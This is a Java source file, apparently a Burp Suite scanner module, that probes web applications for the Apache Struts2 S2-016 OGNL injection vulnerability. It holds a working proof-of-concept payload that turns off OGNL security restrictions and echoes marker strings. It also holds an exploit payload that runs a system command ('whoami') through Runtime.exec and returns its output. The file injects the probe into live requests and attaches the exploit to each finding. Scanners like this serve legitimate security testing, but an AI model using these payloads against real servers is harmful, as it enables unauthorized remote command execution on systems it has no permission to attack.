package module.java.vul;

import burp.*;
import module.Util;

import java.net.URLEncoder;

public class S2_016 extends IModule {
    public String randomMark = Util.getRandomString(16);
    public String[] injectMark = new String[]{randomMark.substring(0, 9), randomMark.substring(9, 16)};

    public String poc =
            "redirect:${" +
            "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
            "#f=#_memberAccess.getClass().getDeclaredField(\"allowStaticMethodAccess\")," +
            "#f.setAccessible(true)," +
            "#f.set(#_memberAccess,true),"+
            "#genxor=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()," +
            "#genxor.print(\"" + injectMark[0] + "\")," +
            "#genxor.print(\"" + injectMark[1] + "\")," +
            "#genxor.flush()," +
            "#genxor.close()" +
            "}";
    public String exp =
        "redirect:${" +
        "#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false," +
        "#f=#_memberAccess.getClass().getDeclaredField(\"allowStaticMethodAccess\")," +
        "#f.setAccessible(true)," +
        "#f.set(#_memberAccess,true)," +
        "#a=@java.lang.Runtime@getRuntime().exec(\"whoami\").getInputStream()," +
        "#b=new java.io.InputStreamReader(#a)," +
        "#c=new java.io.BufferedReader(#b)," +
        "#d=new char[5000]," +
        "#c.read(#d)," +
        "#genxor=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter()," +
        "#genxor.print(#d)," +
        "#genxor.flush()," +
        "#genxor.close()" +
        "}";

    @Override
    public IScanIssue start() {
        IHttpService httpService = iHttpRequestResponse.getHttpService();
        IRequestInfo requestInfo = helpers.analyzeRequest(iHttpRequestResponse);
        byte[] request = iHttpRequestResponse.getRequest();

        byte in = (byte) 0;
        if (requestInfo.getMethod().equals("POST")) {
            in = (byte) 1;
        }
        IParameter newParameter = helpers.buildParameter(URLEncoder.encode(poc), "1", in);
        byte[] newRequest = helpers.updateParameter(request, newParameter);

        IHttpRequestResponse newHttpRequestResponse = callbacks.makeHttpRequest(httpService, newRequest);
        byte[] response = newHttpRequestResponse.getResponse();
        String responseText = helpers.bytesToString(response);
        if (responseText.contains(randomMark)) {
            this.iHttpRequestResponse = newHttpRequestResponse;
            this.detail = URLEncoder.encode(exp);
            return creatCustomScanIssue();
        }
        return null;
    }
}
